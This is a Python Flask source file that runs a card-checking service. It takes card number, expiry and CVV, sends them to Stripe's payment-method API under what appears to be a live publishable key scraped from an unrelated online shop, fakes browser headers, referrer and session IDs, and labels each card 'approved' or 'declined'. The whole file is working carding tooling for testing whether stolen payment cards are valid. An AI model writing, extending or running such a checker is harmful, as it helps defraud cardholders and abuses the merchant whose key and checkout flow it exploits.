from flask import Flask, request, jsonify
import requests
import uuid
import time

app = Flask(__name__)

@app.route('/stripe-auth', methods=['POST'])
def stripe_auth_api():
    """
    Stripe Auth API Endpoint
    Expects JSON: {"card": "CC|MM|YYYY|CVV"}
    """
    try:
        data = request.get_json()
        if not data or 'card' not in data:
            return jsonify({
                "status": "error",
                "message": "Missing card data. Send JSON: {'card': 'CC|MM|YYYY|CVV'}"
            }), 400

        card_details = data['card']
        
        # Process the Stripe auth
        result = execute_stripe_link_auth(card_details)
        
        # Format response as requested
        if result["status"] == "Approved":
            response_text = f"Succellfully got stripe token \"{result.get('pm_id', 'pm_xxx')}\"\n\nfinal response\n\nyour card was approved program was finished"
        else:
            response_text = f"Succellfully got stripe token \"{result.get('pm_id', 'pm_xxx')}\"\n\nfinal response\n\nyour card was declined program was finished"
        
        return jsonify({
            "status": result["status"],
            "response_text": response_text,
            "raw_result": result
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"API Error: {str(e)}"
        }), 500

def execute_stripe_link_auth(card_details: str):
    """
    Execute Stripe Link Auth with dynamic card details
    """
    try:
        cc, mm, yyyy, cvv = card_details.split('|')
        
        # Generate fresh UUIDs
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        client_session_id = str(uuid.uuid4())
        elements_session_id = str(uuid.uuid4())
        payment_details_id = f"csmrpd_{uuid.uuid4().hex[:16]}"
        
        url = 'https://api.stripe.com/v1/payment_methods'
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        }
        
        data = {
            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy',
            'type': 'link',
            'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
            'referrer': 'https://shop.wiseacrebrew.com',
            'time_on_page': '311109',
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': elements_session_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'link[payment_details_id]': payment_details_id,
            'link[card][cvc]': cvv,
            'link[credentials][consumer_session_client_secret]': f"pscs_{uuid.uuid4().hex[:43]}",
            'billing_details[address][country]': 'LK',
            'allow_redisplay': 'unspecified',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            '_stripe_version': '2024-06-20'
        }
        
        response = requests.post(url, headers=headers, data=data, timeout=15)
        
        # Process response
        if response.status_code == 200:
            stripe_json = response.json()
            if stripe_json.get("id"):
                return {
                    "status": "Approved",
                    "message": "Link Auth Successful",
                    "pm_id": stripe_json.get("id"),
                    "brand": stripe_json.get('card', {}).get('brand', 'N/A'),
                    "type": stripe_json.get('card', {}).get('funding', 'N/A'),
                    "country": stripe_json.get('card', {}).get('country', 'N/A')
                }
            else:
                return {
                    "status": "Declined", 
                    "message": "Link Auth Failed - No Payment Method ID",
                    "pm_id": "pm_xxx"
                }
                
        elif response.status_code == 402:
            return {
                "status": "Declined",
                "message": "Card Declined by Stripe",
                "pm_id": "pm_xxx"
            }
        elif response.status_code == 401:
            return {
                "status": "Error",
                "message": "Stripe API Key Invalid",
                "pm_id": "pm_xxx"
            }
        else:
            return {
                "status": "Error",
                "message": f"Stripe API Error: {response.status_code}",
                "pm_id": "pm_xxx"
            }
            
    except Exception as e:
        return {
            "status": "Error",
            "message": f"Auth Processing Error: {str(e)}",
            "pm_id": "pm_xxx"
        }

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "API is running", "timestamp": time.time()})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
